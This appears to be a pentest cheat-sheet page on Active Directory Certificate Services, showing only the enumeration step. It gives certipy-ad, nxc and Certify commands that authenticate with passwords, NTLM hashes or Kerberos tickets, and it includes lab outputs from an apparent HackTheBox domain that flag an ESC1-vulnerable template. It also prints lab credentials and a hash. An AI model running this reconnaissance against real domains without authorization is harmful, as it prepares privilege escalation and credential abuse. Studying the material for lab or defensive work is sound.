---
title: "ADCS"
tags: ["Active Directory", "ADCS", "Certificate Services", "Certify", "Credential Dumping", "Domain Controller", "Kerberos", "LDAP", "Lookup SID", "Pass-The-Cert", "Pass-The-Hash", "Pass-The-Ticket", "Ticket Granting Ticket", "Windows"]
---

{{< filter_buttons >}}

### Enumeration

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}
{{< tab set1-1 tab1 active >}}certipy-ad{{< /tab >}}{{< tab set1-1 tab2 >}}nxc{{< /tab >}}
{{< tabcontent set1-1 tab1 >}}

```console {class="password"}
# Password
certipy-ad find -u '<USER>' -p '<PASSWORD>' -target <TARGET> -text -stdout -vulnerable
```

```console {class="sample-code"}
$ certipy-ad find -u 'ryan.cooper' -p 'NuclearMosquito3' -target dc.sequel.htb -text -stdout -vulnerable
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc.sequel.htb.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

```console {class="ntlm"}
# NTLM
certipy-ad find -u '<USER>' -hashes '<HASH>' -target <TARGET> -text -stdout -vulnerable
```

```console {class="sample-code"}
$ certipy-ad find -u 'ryan.cooper' -hashes '98981eed8e9ce0763bb3c5b3c7ed5945' -target dc.sequel.htb -text -stdout -vulnerable
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc.sequel.htb.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -k -target <TARGET> -text -stdout -vulnerable -dc-host <DC> -ns <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad find -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -k -target dc.sequel.htb -text -stdout -vulnerable -dc-host dc.sequel.htb -ns 10.129.33.22
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
certipy-ad find -u '<USER>@<DOMAIN>' -hashes '<HASH>' -k -target <TARGET> -text -stdout -vulnerable -dc-host <DC> -ns <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad find -u 'ryan.cooper@sequel.htb' -hashes '98981eed8e9ce0763bb3c5b3c7ed5945' -k -target dc.sequel.htb -text -stdout -vulnerable -dc-host dc.sequel.htb -ns 10.129.33.22
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
certipy-ad find -u '<USER>@<DOMAIN>' -k -target <TARGET> -text -stdout -vulnerable -dc-host <DC> -ns <DC_IP>
```

```console {class="sample-code"}
$ certipy-ad find -u 'ryan.cooper@sequel.htb' -k -target dc.sequel.htb -text -stdout -vulnerable -dc-host dc.sequel.htb -ns 10.129.33.22                                 
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb
    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
    Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

{{< /tabcontent >}}
{{< tabcontent set1-1 tab2 >}}

```console {class="password"}
# Password
nxc ldap <TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -M adcs
```

```console {class="sample-code"}
$ nxc ldap dc.sequel.htb -d sequel.htb -u 'ryan.cooper' -p 'NuclearMosquito3' -M adcs
LDAP        10.129.33.22    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
LDAPS       10.129.33.22    636    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 
ADCS        10.129.33.22    389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.33.22    389    DC               Found PKI Enrollment Server: dc.sequel.htb
ADCS        10.129.33.22    389    DC               Found CN: sequel-DC-CA
```

```console {class="ntlm"}
# NTLM
nxc ldap <TARGET> -d <DOMAIN> -u '<USER>' -H '<HASH>' -M adcs
```

```console {class="sample-code"}
$ nxc ldap dc.sequel.htb -d sequel.htb -u 'ryan.cooper' -H '98981eed8e9ce0763bb3c5b3c7ed5945' -M adcs
LDAP        10.129.33.22    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
LDAPS       10.129.33.22    636    DC               [+] sequel.htb\ryan.cooper:98981eed8e9ce0763bb3c5b3c7ed5945 
ADCS        10.129.33.22    389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.33.22    389    DC               Found PKI Enrollment Server: dc.sequel.htb
ADCS        10.129.33.22    389    DC               Found CN: sequel-DC-CA
```

```console {class="password-based-kerberos"}
# Password-based Kerberos
nxc ldap <TARGET> -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --kdcHost <DC> -M adcs
```

```console {class="sample-code"}
$ nxc ldap dc.sequel.htb -d sequel.htb -u 'ryan.cooper' -p 'NuclearMosquito3' -k --kdcHost dc.sequel.htb -M adcs
LDAP        dc.sequel.htb   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
LDAPS       dc.sequel.htb   636    DC               [+] sequel.htb\ryan.cooper 
ADCS        dc.sequel.htb   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        dc.sequel.htb   389    DC               Found PKI Enrollment Server: dc.sequel.htb
ADCS        dc.sequel.htb   389    DC               Found CN: sequel-DC-CA
```

```console {class="ntlm-based-kerberos"}
# NTLM-based Kerberos
nxc ldap <TARGET> -d <DOMAIN> -u '<USER>' -H '<HASH>' -k --kdcHost <DC> -M adcs
```

```console {class="sample-code"}
$ nxc ldap dc.sequel.htb -d sequel.htb -u 'ryan.cooper' -H '98981eed8e9ce0763bb3c5b3c7ed5945' -k --kdcHost dc.sequel.htb -M adcs
LDAP        dc.sequel.htb   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
LDAPS       dc.sequel.htb   636    DC               [+] sequel.htb\ryan.cooper 
ADCS        dc.sequel.htb   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        dc.sequel.htb   389    DC               Found PKI Enrollment Server: dc.sequel.htb
ADCS        dc.sequel.htb   389    DC               Found CN: sequel-DC-CA
```

```console {class="ticket-based-kerberos"}
# Ticket-based Kerberos
nxc ldap <TARGET> -d <DOMAIN> -u '<USER>' -k --kdcHost <DC> --use-kcache -M adcs
```

```console {class="sample-code"}
$ nxc ldap dc.sequel.htb -d sequel.htb -u 'ryan.cooper' -k --kdcHost dc.sequel.htb --use-kcache -M adcs
LDAP        dc.sequel.htb   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
LDAPS       dc.sequel.htb   636    DC               [+] sequel.htb\ryan.cooper 
ADCS        dc.sequel.htb   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        dc.sequel.htb   389    DC               Found PKI Enrollment Server: dc.sequel.htb
ADCS        dc.sequel.htb   389    DC               Found CN: sequel-DC-CA
```

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}
{{< tab set1-2 tab1 active>}}certify{{< /tab >}}{{< tab set1-2 tab2 >}}powershell{{< /tab >}}
{{< tabcontent set1-2 tab1 >}}

```console
# Enum CAs
.\Certify.exe enum-cas
```

```console {class="sample-code"}
evil-winrm-py PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe enum-cas

   _____          _   _  __          
  / ____|        | | (_)/ _|         
 | |     ___ _ __| |_ _| |_ _   _    
 | |    / _ \ '__| __| |  _| | | |   
 | |___|  __/ |  | |_| | | | |_| |   
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |   
                            |___./   
  v2.0.0                         

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'
[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.

[*] Root CAs

    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb

[*] NTAuthCertificates - Certificates that enable authentication:

    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
[X] AuthWithChannelBinding HTTP request for URL 'http://dc.sequel.htb/certsrv/' failed with error: An error occurred while sending the request.
[X] AuthWithChannelBinding HTTP request for URL 'https://dc.sequel.htb/certsrv/' failed with error: An error occurred while sending the request.

[*] Enterprise/enrollment certificate authorities:

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    User Specifies SAN            : Disabled
    RPC Request Encryption        : Enabled
    CA Permissions
      Owner: BUILTIN\Administrators             S-1-5-32-544

      Access Rights                                     Principal
      Allow  Enroll                                     NT AUTHORITY\Authenticated Users   S-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators             S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins               S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins           S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

    Enabled Certificate Templates:
        UserAuthentication
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator

Certify completed in 00:00:40.0515822
```

```console
# Find vulnerable templates
.\Certify.exe enum-templates --filter-vulnerable --current-user
```

```console {class="sample-code"}
evil-winrm-py PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe enum-templates --filter-vulnerable --current-user

   _____          _   _  __          
  / ____|        | | (_)/ _|         
 | |     ___ _ __| |_ _| |_ _   _    
 | |    / _ \ '__| __| |  _| | | |   
 | |___|  __/ |  | |_| | | | |_| |   
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |   
                            |___./   
  v2.0.0                         

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'
[*] Classifying vulnerabilities in the context of the current user ('sequel\Ryan.Cooper') and its unrolled groups.
[X] AuthWithChannelBinding HTTP request for URL 'http://dc.sequel.htb/certsrv/' failed with error: An error occurred while sending the request.
[X] AuthWithChannelBinding HTTP request for URL 'https://dc.sequel.htb/certsrv/' failed with error: An error occurred while sending the request.

[*] Listing info about the enterprise certificate authority 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    User Specifies SAN            : Disabled
    RPC Request Encryption        : Enabled
    CA Permissions
      Owner: BUILTIN\Administrators             S-1-5-32-544

      Access Rights                                     Principal
      Allow  Enroll                                     NT AUTHORITY\Authenticated Users   S-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators             S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins               S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins           S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[*] Certificate templates found using the current filter parameters:

    Template Name                         : UserAuthentication
    Enabled                               : True
    Publishing CAs                        : dc.sequel.htb\sequel-DC-CA
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    Certificate Name Flag                 : ENROLLEE_SUPPLIES_SUBJECT
    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Manager Approval Required             : False
    Authorized Signatures Required        : 0
    Extended Key Usage                    : Client Authentication, Encrypting File System, Secure Email
    Certificate Application Policies      : Client Authentication, Encrypting File System, Secure Email
    Vulnerabilities
      ESC1                                : The template has a client authentication EKU and allows enrollees to supply subject.
    Permissions
      Enrollment Permissions
